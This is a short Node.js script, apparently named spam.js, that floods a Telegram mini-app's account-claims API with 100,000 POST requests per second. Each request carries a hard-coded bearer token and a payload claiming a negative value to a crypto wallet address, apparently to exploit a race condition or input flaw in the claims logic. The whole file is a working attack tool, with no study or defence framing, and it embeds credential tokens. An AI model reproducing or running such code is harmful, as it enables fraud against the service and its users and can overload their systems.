// Still from spam.js, Feat there!
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
import { serialize } from 'cookie';

// const endpoint = 'https://hotinstantpayment.cyynai.com/verify-tg-task/60/';
const endpoint = 'https://api.miniapp.tiwiflix.pro/account/claims';

const authHeader = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImlkIjoiZDhjZDA0ZmYtNmNkZi00OWEyLWIxNGYtN2I2ODc1MDA3MDIzIiwibmFtZSI6IkFsZXggIiwidGVsZWdyYW1JZCI6IjcwMjIyODE2NzAiLCJlbWFpbCI6bnVsbCwicGhvdG9VcmwiOm51bGwsInVzZXJuYW1lIjoiYWxleG9oZ2VlIiwiY2xhaW1BZGRyZXNzIjpudWxsLCJ0b25BZGRyZXNzIjpudWxsLCJpc1ByZW1pdW0iOmZhbHNlLCJyZWZlcnJhbENvZGUiOiJoNFVrNVFTZiIsInJlZmVycmVySWQiOiJjYmM5YzQyMy1jNWEyLTQ5MjUtOTQyNi1hYTJkN2RjYzRkYzIiLCJ3ZWJzb2NrZXRJZCI6bnVsbCwiYWNjb3VudFR5cGUiOiJ1c2VyIiwibGV2ZWxJZCI6ImI4NjNjNDUyLWZhNzQtNDI5YS05MDJkLTVkNjViY2E2ZjEzYiIsInN0YXR1cyI6ImFjdGl2ZSIsImNyZWF0ZWRBdCI6IjIwMjUtMDgtMjVUMTk6Mzg6MjYuMDE2WiIsInVwZGF0ZWRBdCI6IjIwMjUtMDgtMjVUMjI6NDY6MzIuODIxWiJ9LCJ1c2VySWQiOiJkOGNkMDRmZi02Y2RmLTQ5YTItYjE0Zi03YjY4NzUwMDcwMjMiLCJpYXQiOjE3NTYxNjE5OTZ9.7obQv1HKlokQtOWq0SItXTsx8l-cX7yB3jQZKC9pUXU';

// const cookies = serialize('sessionid', 'vb624q3mq9ifj1elsd13rxtce8f12ch6')

const payload = {
    value: "-10000000000000",
    claimAddress: "0x19fd09f9d9434fd48581e0b5e9e535d884ee2be0",
    fee: 20
}

async function sendRequests(requestCount) {
    const promises = [];
    
    for (let i = 0; i < requestCount; i++) {
        promises.push(
            fetch(endpoint, {
                method: 'POST',
                headers: {
                    'Authorization': authHeader,
                    'Content-type': 'application/json',
                    // 'Cookie': cookies,
                    // 'x-csrftoken': 'DMFKdkEMORT4xUo4Gm8YYQICniUPTQsAAvf8pSjS7l7IJHY4U020KSeLEbleyCQ0'
                },
                body: JSON.stringify(payload)
            })
            .then(response => response.text())
            .then(data => console.log(data))
            .catch(err => console.error('Request failed', err))
        );
    }

    await Promise.all(promises);
    console.log(`Sent ${requestCount} requests successfully`);
}

const requestsPerSecond = 100000;
setInterval(() => {
    sendRequests(requestsPerSecond);
}, 1000);